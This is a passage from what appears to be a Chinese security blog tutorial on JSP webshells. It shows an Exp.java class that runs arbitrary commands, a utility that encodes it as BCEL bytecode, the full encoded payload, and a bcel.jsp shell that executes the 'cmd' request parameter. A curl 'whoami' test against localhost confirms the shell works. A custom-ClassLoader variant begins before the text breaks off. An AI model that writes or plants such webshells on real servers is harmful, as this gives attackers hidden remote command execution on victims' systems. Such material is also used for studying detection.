<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Util</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URI uri = Util.class.getResource(<span class="string">&quot;Exp.class&quot;</span>).toURI();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Files.readAllBytes(Paths.get(uri));</span><br><span class="line">        String bcel = Utility.encode(bytes, <span class="keyword">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span> + bcel);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>$$BCEL$$</code>开头的字节码在被bcel类加载的时候会执行字节码。</p>
<p>运行Util.java</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span><span class="symbol">$</span>BCEL<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>l<span class="symbol">$</span><span class="number">8</span>b<span class="symbol">$</span>I<span class="symbol">$</span>A<span class="symbol">$</span>A<span class="symbol">$</span>A<span class="symbol">$</span>A<span class="symbol">$</span>A<span class="symbol">$</span>A<span class="symbol">$</span>A<span class="symbol">$</span><span class="number">85</span>S<span class="symbol">$</span>dbR<span class="symbol">$</span>TA<span class="symbol">$</span>Q<span class="symbol">$</span><span class="number">3</span>d<span class="symbol">$</span><span class="number">93</span>l2aY<span class="symbol">$</span>I<span class="symbol">$</span><span class="number">84</span><span class="symbol">$</span>A<span class="symbol">$</span>c1<span class="symbol">$</span>bbx<span class="symbol">$</span>n<span class="symbol">$</span><span class="number">84</span><span class="symbol">$</span><span class="number">84</span>xAQ<span class="symbol">$</span><span class="number">40</span>P<span class="symbol">$</span>Q<span class="symbol">$</span>U<span class="symbol">$</span>N<span class="symbol">$</span>c1<span class="symbol">$</span>C<span class="symbol">$</span>L<span class="symbol">$</span>w<span class="symbol">$</span><span class="number">8</span>f<span class="symbol">$</span>cbf<span class="symbol">$</span>c0<span class="symbol">$</span>c5d7<span class="symbol">$</span>b5<span class="symbol">$</span>d9X<span class="symbol">$</span>fc<span class="symbol">$</span><span class="number">91</span><span class="symbol">$</span>afZ<span class="symbol">$</span>a5<span class="symbol">$</span><span class="number">89</span><span class="symbol">$</span>rU<span class="symbol">$</span><span class="number">3</span>e<span class="symbol">$</span>fa<span class="symbol">$</span>e0G<span class="symbol">$</span>f8<span class="symbol">$</span>B<span class="symbol">$</span><span class="number">7</span>e<span class="symbol">$</span><span class="number">83</span><span class="symbol">$</span>r<span class="symbol">$</span>f6l<span class="symbol">$</span>WB<span class="symbol">$</span><span class="number">8</span>aX<span class="symbol">$</span><span class="number">3</span>el<span class="symbol">$</span>cft<span class="symbol">$</span><span class="number">9</span>fN<span class="symbol">$</span>f7<span class="symbol">$</span>e9<span class="symbol">$</span><span class="number">93</span><span class="symbol">$</span><span class="number">9</span>e<span class="symbol">$</span>l<span class="symbol">$</span><span class="number">7</span>f<span class="symbol">$</span>be<span class="symbol">$</span><span class="number">7</span>e<span class="symbol">$</span>Dp<span class="symbol">$</span>Xy<span class="symbol">$</span>V<span class="symbol">$</span>fdHsdT<span class="symbol">$</span>E<span class="symbol">$</span><span class="number">90</span>V1<span class="symbol">$</span><span class="number">89</span><span class="symbol">$</span>ac4<span class="symbol">$</span>b78ns<span class="symbol">$</span>dcQ<span class="symbol">$</span>vcJ<span class="symbol">$</span>F<span class="symbol">$</span>c7<span class="symbol">$</span><span class="number">3</span>d<span class="symbol">$</span>Va<span class="symbol">$</span>dc<span class="symbol">$</span><span class="number">97</span>fZ<span class="symbol">$</span>s<span class="symbol">$</span><span class="number">3</span>e<span class="symbol">$</span><span class="number">88</span><span class="symbol">$</span>e0<span class="symbol">$</span>a1<span class="symbol">$</span><span class="number">3</span>cg<span class="symbol">$</span>ba<span class="symbol">$</span>d0<span class="symbol">$</span><span class="number">87</span>Y<span class="symbol">$</span><span class="number">8e9</span><span class="symbol">$</span><span class="number">8</span>eG<span class="symbol">$</span>MAGT<span class="symbol">$</span>Zb<span class="symbol">$</span>b9<span class="symbol">$</span><span class="number">7</span>d<span class="symbol">$</span>fd<span class="symbol">$</span><span class="number">9</span>d<span class="symbol">$</span><span class="number">9</span>e<span class="symbol">$</span>z<span class="symbol">$</span>e9<span class="symbol">$</span>d6<span class="symbol">$</span><span class="number">5</span>ev<span class="symbol">$</span>d3uLko<span class="symbol">$</span><span class="number">96</span><span class="symbol">$</span>n<span class="symbol">$</span><span class="number">3</span>cgZ<span class="symbol">$</span>a6<span class="symbol">$</span><span class="number">3</span>b<span class="symbol">$</span>cf0<span class="symbol">$</span><span class="number">98</span><span class="symbol">$</span><span class="number">3</span>c<span class="symbol">$</span>L<span class="symbol">$</span><span class="number">8</span>fo1<span class="symbol">$</span>uKvQ0Ds<span class="symbol">$</span>a6<span class="symbol">$</span>r<span class="symbol">$</span>f2<span class="symbol">$</span>b5<span class="symbol">$</span>f2<span class="symbol">$</span><span class="number">8</span>ep<span class="symbol">$</span><span class="number">5</span>e<span class="symbol">$</span>eb<span class="symbol">$</span><span class="number">3</span>b<span class="symbol">$</span>r<span class="symbol">$</span>n<span class="symbol">$</span>cb<span class="symbol">$</span>d9<span class="symbol">$</span><span class="number">86</span><span class="symbol">$</span><span class="number">5</span>e<span class="symbol">$</span>da<span class="symbol">$</span>d2<span class="symbol">$</span>jS<span class="symbol">$</span>fa<span class="symbol">$</span><span class="number">7</span>ePq<span class="symbol">$</span>df<span class="symbol">$</span><span class="number">98</span><span class="symbol">$</span>d4<span class="symbol">$</span>w<span class="symbol">$</span><span class="number">94</span><span class="symbol">$</span><span class="number">5</span>b<span class="symbol">$</span><span class="number">3</span>e<span class="symbol">$</span>a8P<span class="symbol">$</span>f5<span class="symbol">$</span>a0Q<span class="symbol">$</span><span class="symbol">$</span><span class="number">2</span><span class="symbol">$</span>f4T<span class="symbol">$</span>bdr<span class="symbol">$</span><span class="number">8</span>b5<span class="symbol">$</span>b3T<span class="symbol">$</span>U<span class="symbol">$</span>O<span class="symbol">$</span>c3<span class="symbol">$</span>c8<span class="symbol">$</span><span class="number">99</span>N<span class="symbol">$</span><span class="number">3</span>e<span class="symbol">$</span>q<span class="symbol">$</span>f98B<span class="symbol">$</span>f7<span class="symbol">$</span><span class="number">92</span><span class="symbol">$</span>S<span class="symbol">$</span>cd<span class="symbol">$</span>q<span class="symbol">$</span>d3<span class="symbol">$</span>ce<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>d6vw<span class="symbol">$</span><span class="number">85</span><span class="symbol">$</span>p<span class="symbol">$</span><span class="number">8</span>a<span class="symbol">$</span>h<span class="symbol">$</span>kB9J<span class="symbol">$</span><span class="number">89</span><span class="symbol">$</span>b8P<span class="symbol">$</span>d9MW7<span class="symbol">$</span>de<span class="symbol">$</span>ae<span class="symbol">$</span>e9<span class="symbol">$</span>V<span class="symbol">$</span>af<span class="symbol">$</span>b77<span class="symbol">$</span>eb<span class="symbol">$</span><span class="number">3</span>c<span class="symbol">$</span>e9E<span class="symbol">$</span>C1<span class="symbol">$</span>a8<span class="symbol">$</span>cb<span class="symbol">$</span>H<span class="symbol">$</span><span class="number">86</span><span class="symbol">$</span>a8<span class="symbol">$</span>b8<span class="symbol">$</span>a6mU9<span class="symbol">$</span>W<span class="symbol">$</span>Y<span class="symbol">$</span>o<span class="symbol">$</span>ae<span class="symbol">$</span>dd<span class="symbol">$</span>ec<span class="symbol">$</span>c4<span class="symbol">$</span>QO<span class="symbol">$</span><span class="number">8</span>ew<span class="symbol">$</span>SB<span class="symbol">$</span>dd<span class="symbol">$</span>b4k<span class="symbol">$</span><span class="number">8</span>e<span class="symbol">$</span>nVL9F<span class="symbol">$</span><span class="number">84</span><span class="symbol">$</span>e8O<span class="symbol">$</span>ca<span class="symbol">$</span>q<span class="symbol">$</span>Nq<span class="symbol">$</span><span class="number">3</span>cf<span class="symbol">$</span>Y<span class="symbol">$</span>fe<span class="symbol">$</span>Ha<span class="symbol">$</span><span class="number">8</span>e<span class="symbol">$</span>t<span class="symbol">$</span>g<span class="symbol">$</span>W<span class="symbol">$</span>b1<span class="symbol">$</span>a4<span class="symbol">$</span>e1<span class="symbol">$</span>v<span class="symbol">$</span><span class="number">96</span><span class="symbol">$</span>Z<span class="symbol">$</span><span class="number">86</span><span class="symbol">$</span><span class="number">3</span>aS<span class="symbol">$</span>a6<span class="symbol">$</span><span class="number">89</span><span class="symbol">$</span><span class="number">8</span>f<span class="symbol">$</span><span class="number">81</span>U<span class="symbol">$</span>abRs<span class="symbol">$</span>a9<span class="symbol">$</span><span class="number">84</span><span class="symbol">$</span>d0<span class="symbol">$</span>cbM<span class="symbol">$</span><span class="number">8</span>ccE<span class="symbol">$</span>c33<span class="symbol">$</span><span class="number">3</span>c<span class="symbol">$</span><span class="number">97</span><span class="symbol">$</span><span class="number">8</span>dV<span class="symbol">$</span>a5y<span class="symbol">$</span>a1<span class="symbol">$</span>e1<span class="symbol">$</span>r<span class="symbol">$</span>c65<span class="symbol">$</span>e4<span class="symbol">$</span>b0<span class="symbol">$</span>c6<span class="symbol">$</span>c0T<span class="symbol">$</span>NI<span class="symbol">$</span>e9<span class="symbol">$</span>c50<span class="symbol">$</span><span class="number">40</span>j<span class="symbol">$</span>S<span class="symbol">$</span>x<span class="symbol">$</span><span class="number">86</span><span class="symbol">$</span>be<span class="symbol">$</span>W<span class="symbol">$</span><span class="number">97</span><span class="symbol">$</span>f5<span class="symbol">$</span><span class="number">9</span>d<span class="symbol">$</span><span class="number">7</span>da<span class="symbol">$</span>b8m<span class="symbol">$</span>a1<span class="symbol">$</span>e3<span class="symbol">$</span>v<span class="symbol">$</span>HZ<span class="symbol">$</span>a1<span class="symbol">$</span>T<span class="symbol">$</span>v<span class="symbol">$</span>a8BR<span class="symbol">$</span>fe<span class="symbol">$</span>a5<span class="symbol">$</span>fd<span class="symbol">$</span>zl<span class="symbol">$</span>a3f<span class="symbol">$</span>b9f<span class="symbol">$</span><span class="number">99</span><span class="symbol">$</span>sV<span class="symbol">$</span>f7<span class="symbol">$</span><span class="number">84</span><span class="symbol">$</span><span class="number">7</span>b<span class="symbol">$</span>e2<span class="symbol">$</span>M<span class="symbol">$</span>b6I<span class="symbol">$</span>e4<span class="symbol">$</span><span class="number">87</span><span class="symbol">$</span>a5<span class="symbol">$</span>f0<span class="symbol">$</span>e2<span class="symbol">$</span><span class="number">40</span><span class="symbol">$</span>Y<span class="symbol">$</span>Mc<span class="symbol">$</span><span class="number">9</span>dV<span class="symbol">$</span>e5T<span class="symbol">$</span>e8<span class="symbol">$</span><span class="number">95</span>c<span class="symbol">$</span>h<span class="symbol">$</span>a2Z<span class="symbol">$</span><span class="number">9</span>dm<span class="symbol">$</span>eb<span class="symbol">$</span>e4<span class="symbol">$</span>H<span class="symbol">$</span>Zz<span class="symbol">$</span>a9<span class="symbol">$</span>d3<span class="symbol">$</span>v<span class="symbol">$</span>ZH<span class="symbol">$</span>dc<span class="symbol">$</span>e3n<span class="symbol">$</span>ed<span class="symbol">$</span>fa<span class="symbol">$</span>d0<span class="symbol">$</span>cf<span class="symbol">$</span>T<span class="symbol">$</span>c9<span class="symbol">$</span><span class="number">8</span>e<span class="symbol">$</span><span class="number">80</span><span class="symbol">$</span><span class="number">9</span>ca<span class="symbol">$</span>a0<span class="symbol">$</span>F<span class="symbol">$</span>f9<span class="symbol">$</span><span class="number">7</span>b<span class="symbol">$</span>n<span class="symbol">$</span>a3<span class="symbol">$</span>R<span class="symbol">$</span>b9<span class="symbol">$</span><span class="number">3</span>d9o<span class="symbol">$</span><span class="number">3</span>b<span class="symbol">$</span>c2z<span class="symbol">$</span>a5<span class="symbol">$</span>o<span class="symbol">$</span>y<span class="symbol">$</span>da<span class="symbol">$</span>be<span class="symbol">$</span>cc<span class="symbol">$</span><span class="number">7</span>f<span class="symbol">$</span>d8<span class="symbol">$</span>b6o<span class="symbol">$</span>m<span class="symbol">$</span>ae<span class="symbol">$</span>d2<span class="symbol">$</span>c3<span class="symbol">$</span>e9<span class="symbol">$</span>a7<span class="symbol">$</span>X<span class="symbol">$</span>c8<span class="symbol">$</span>e8<span class="symbol">$</span>p<span class="symbol">$</span>d5<span class="symbol">$</span>c9<span class="symbol">$</span>G<span class="symbol">$</span>e8<span class="symbol">$</span>k<span class="symbol">$</span>c7<span class="symbol">$</span>m<span class="symbol">$</span><span class="number">9</span>dC<span class="symbol">$</span>e4<span class="symbol">$</span>fd<span class="symbol">$</span>a4<span class="symbol">$</span>a7<span class="symbol">$</span>W<span class="symbol">$</span>a2s<span class="symbol">$</span><span class="number">3</span>d<span class="symbol">$</span>d5<span class="symbol">$</span>A<span class="symbol">$</span><span class="number">3</span>bD<span class="symbol">$</span>a0<span class="symbol">$</span>d0<span class="symbol">$</span><span class="number">40</span>p<span class="symbol">$</span>ed<span class="symbol">$</span>L<span class="symbol">$</span><span class="number">94</span><span class="symbol">$</span><span class="number">89</span><span class="symbol">$</span><span class="number">3</span>aB<span class="symbol">$</span>db<span class="symbol">$</span><span class="number">87</span><span class="symbol">$</span>I<span class="symbol">$</span>X<span class="symbol">$</span>O<span class="symbol">$</span>c1<span class="symbol">$</span>L<span class="symbol">$</span>be_G<span class="symbol">$</span>a4<span class="symbol">$</span><span class="number">81</span><span class="symbol">$</span>ae<span class="symbol">$</span>G<span class="symbol">$</span>d4<span class="symbol">$</span><span class="number">7</span>c<span class="symbol">$</span>a6<span class="symbol">$</span><span class="number">8</span>e<span class="symbol">$</span>ee<span class="symbol">$</span>c2<span class="symbol">$</span><span class="number">8</span>c<span class="symbol">$</span>f2<span class="symbol">$</span>j<span class="symbol">$</span>b1<span class="symbol">$</span>f4<span class="symbol">$</span><span class="number">88</span>R<span class="symbol">$</span><span class="number">87</span><span class="symbol">$</span>W<span class="symbol">$</span>eb<span class="symbol">$</span>n<span class="symbol">$</span>b3<span class="symbol">$</span>fd<span class="symbol">$</span>fe<span class="symbol">$</span>e8W<span class="symbol">$</span>w<span class="symbol">$</span><span class="number">5</span>dG<span class="symbol">$</span>efgD<span class="symbol">$</span><span class="number">3</span>fR<span class="symbol">$</span>c9<span class="symbol">$</span>m<span class="symbol">$</span><span class="number">86</span><span class="symbol">$</span>c9<span class="symbol">$</span><span class="number">8</span>e<span class="symbol">$</span>oB6<span class="symbol">$</span>M<span class="symbol">$</span><span class="number">85</span><span class="symbol">$</span><span class="number">5</span>e<span class="symbol">$</span>b7F<span class="symbol">$</span>f78<span class="symbol">$</span>ba<span class="symbol">$</span><span class="number">90</span>A7<span class="symbol">$</span>a6<span class="symbol">$</span>c9<span class="symbol">$</span><span class="number">5</span>bA<span class="symbol">$</span>_<span class="symbol">$</span>f2<span class="symbol">$</span><span class="number">88</span><span class="symbol">$</span>oA<span class="symbol">$</span>ZSM<span class="symbol">$</span>g<span class="symbol">$</span>Y<span class="symbol">$</span>c19<span class="symbol">$</span>c0<span class="symbol">$</span>bb<span class="symbol">$</span><span class="number">9</span>d<span class="symbol">$</span>t<span class="symbol">$</span>ba<span class="symbol">$</span><span class="number">8</span>c<span class="symbol">$</span>b2<span class="symbol">$</span><span class="number">96</span>p<span class="symbol">$</span>B<span class="symbol">$</span>X<span class="symbol">$</span><span class="number">89</span>n<span class="symbol">$</span><span class="number">86</span>j<span class="symbol">$</span><span class="number">5</span>d<span class="symbol">$</span>c2e<span class="symbol">$</span>aa<span class="symbol">$</span><span class="number">3</span>bE<span class="symbol">$</span>d8<span class="symbol">$</span>VB<span class="symbol">$</span>V<span class="symbol">$</span>g<span class="symbol">$</span>Pt<span class="symbol">$</span>P<span class="symbol">$</span>i<span class="symbol">$</span>R<span class="symbol">$</span>a8p<span class="symbol">$</span><span class="number">8</span>cr<span class="symbol">$</span><span class="number">5</span>c<span class="symbol">$</span>e3<span class="symbol">$</span>b8<span class="symbol">$</span>ceq<span class="symbol">$</span>D<span class="symbol">$</span>f8<span class="symbol">$</span><span class="number">8</span>d<span class="symbol">$</span>Ey<span class="symbol">$</span>b8I<span class="symbol">$</span>J<span class="symbol">$</span>K<span class="symbol">$</span><span class="number">95</span><span class="symbol">$</span>Z<span class="symbol">$</span>a3<span class="symbol">$</span><span class="number">8</span>fV<span class="symbol">$</span><span class="number">8</span>f<span class="symbol">$</span>ac<span class="symbol">$</span><span class="number">9</span>c<span class="symbol">$</span><span class="number">3</span>aK<span class="symbol">$</span>a7T<span class="symbol">$</span>q<span class="symbol">$</span><span class="number">94</span><span class="symbol">$</span>fa<span class="symbol">$</span><span class="number">84</span><span class="symbol">$</span>e8<span class="symbol">$</span>HO<span class="symbol">$</span><span class="number">94</span>a<span class="symbol">$</span><span class="number">8</span>feS<span class="symbol">$</span>s<span class="symbol">$</span>c9Gk<span class="symbol">$</span>s<span class="symbol">$</span>f8<span class="symbol">$</span><span class="number">7</span>c<span class="symbol">$</span>YR<span class="symbol">$</span><span class="number">5</span>e<span class="symbol">$</span>d6<span class="symbol">$</span>c4_<span class="symbol">$</span>L<span class="symbol">$</span>ea<span class="symbol">$</span><span class="number">8</span>b<span class="symbol">$</span><span class="number">87</span><span class="symbol">$</span>d1<span class="symbol">$</span>E<span class="symbol">$</span>A<span class="symbol">$</span>A</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将运行的结果插入jsp</p>
<p>bcel.jsp</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    String bcel = <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85S$dbR$TA$Q$3d$93l2aY$I$84$A$c1$bbx$n$84$84xAQ$40P$Q$U$N$c1$C$L$w$8f$cbf$c0$c5d7$b5$d9X$fc$91$afZ$a5$89$rU$3e$fa$e0G$f8$B$7e$83$r$f6l$WB$8aX$3el$cft$9fN$f7$e9$93$9e$l$7f$be$7e$Dp$Xy$V$fdHsdT$E$90V1$89$ac4$b78ns$dcQ$vcJ$F$c7$3d$Va$dc$97fZ$s$3e$88$e0$a1$3cg$ba$d0$87Y$8e9$8eG$MAGT$Zb$b9$7d$fd$9d$9e$z$e9$d6$5ev$d3uLko$96$n$3cgZ$a6$3b$cf0$98$3c$L$8fo1$uKvQ0Ds$a6$r$f2$b5$f2$8ep$5e$eb$3b$r$n$cb$d9$86$5e$da$d2$jS$fa$7ePq$df$98$d4$w$94$5b$3e$a8P$f5$a0Q$$2$f4T$bdr$8b5$b3T$U$O$c3$c8$99N$3e$q$f98B$f7$92$S$cd$q$d3$ce$$$d6vw$85$p$8a$h$kB9J$89$b8P$d9MW7$de$ae$e9$V$af$b77$eb$3c$e9E$C1$a8$cb$H$86$a8$b8$a6mU9$W$Y$o$ae$dd$ec$c4$QO$8ew$SB$dd$b4k$8e$nVL9F$84$e8O$ca$q$Nq$3cf$Y$fe$Ha$8e$t$g$W$b1$a4$e1$v$96$Z$86$3aS$a6$89$8f$81U$abRs$a9$84$d0$cbM$8ccE$c33$3c$97$8dV$a5y$a1$e1$r$c65$e4$b0$c6$c0T$NI$e9$c50$40j$S$x$86$be$W$97$f5$9d$7da$b8m$a1$e3$v$HZ$a1$T$v$a8BR$fe$a5$fd$zl$a3f$b9f$99$sV$f7$84$7b$e2$M$b6I$e4$87$a5$f0$e2$40$Y$Mc$9dV$e5T$e8$95c$h$a2Z$9dm$eb$e4$H$Zz$a9$d3$v$ZH$dc$e3n$ed$fa$d0$cf$T$c9$8e$80$9ca$a0$F$f9$7b$n$a3$R$b9$3d9o$3b$c2z$a5$o$y$da$be$cc$7f$d8$b6o$m$ae$d2$c3$e9$a7$X$c8$e8$p$d5$c9$G$e8$k$c7$m$9dC$e4$fd$a4$a7$W$a2s$3d$d5$A$3bD$a0$d0$40p$ed$L$94$89$3aB$db$87$I$X$O$c1$L$be_G$a4$81$ae$G$d4$7c$a6$8e$ee$c2$8c$f2$j$b1$f4$88R$87$W$eb$n$b3$fd$fe$e8W$w$5dG$efgD$3fR$c9$m$86$c9$8e$oB6$M$85$5e$b7F$f78$ba$90A7$a6$c9$5bA$_$f2$88$oA$ZSM$g$Y$c19$c0$bb$9d$t$ba$8c$b2$96p$B$X$89n$86j$5d$c2e$aa$3bE$d8$VB$V$g$Pt$P$i$R$a8p$8cr$5c$e3$b8$ceq$D$f8$8d$Ey$b8I$J$K$95$Z$a3$8fV$8f$ac$9c$3aK$a7T$q$94$fa$84$e8$HO$94a$8feS$s$c9Gk$s$f8$7c$YR$5e$d6$c4_$L$ea$8b$87$d1$E$A$A&quot;</span>;</span><br><span class="line">    Class&lt;?&gt; _loader = Class.forName(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>);</span><br><span class="line">    ClassLoader loader = (ClassLoader) _loader.newInstance();</span><br><span class="line">    Class&lt;?&gt; _obj = loader.loadClass(bcel);</span><br><span class="line">    Constructor&lt;?&gt; constructor = _obj.getConstructor(String.class);</span><br><span class="line">    Object obj = constructor.newInstance(cmd);</span><br><span class="line">    response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    response.getWriter().print(obj.toString());</span><br><span class="line">    response.getWriter().print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[shadowflow<span class="meta">@ShadowOS</span> /tmp]% curl http:<span class="comment">//localhost:8080/jspshell_war/bcel.jsp?cmd=whoami</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>shadowflow</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>执行成功</p>
<h2 id="8-自定义ClassLoader"><a href="#8-自定义ClassLoader" class="headerlink" title="8. 自定义ClassLoader"></a>8. 自定义ClassLoader</h2><p>自定义ClassLoader的方式和BCEL的方式是类似的，只是BCEL是转换成BCEL字节码，而ClassLoader是转为真正的字节码</p>
<p>exp.java不变</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    String res;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exp</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line=reader.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            stringBuilder.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">this</span>.res = stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Util.java，将Exp转为字节码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Util</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URI uri = Util.class.getResource(<span class="string">&quot;Exp.class&quot;</span>).toURI();</span><br><span class="line">        <span class="keyword">byte</span>[] codeBytes = Files.readAllBytes(Paths.get(uri));</span><br><span class="line">        String base = Base64.getEncoder().encodeToString(codeBytes);</span><br><span class="line">        System.out.println(base);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/bin/</span>java -javaagent:<span class="regexp">/Applications/</span>IntelliJ IDEA.app<span class="regexp">/Contents/</span>lib<span class="regexp">/idea_rt.jar=63386:/</span>Applications<span class="regexp">/IntelliJ IDEA.app/</span>Contents<span class="regexp">/bin -Dfile.encoding=UTF-8 -classpath /</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>charsets.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/deploy.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/cldrdata.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/dnsns.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/jaccess.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span 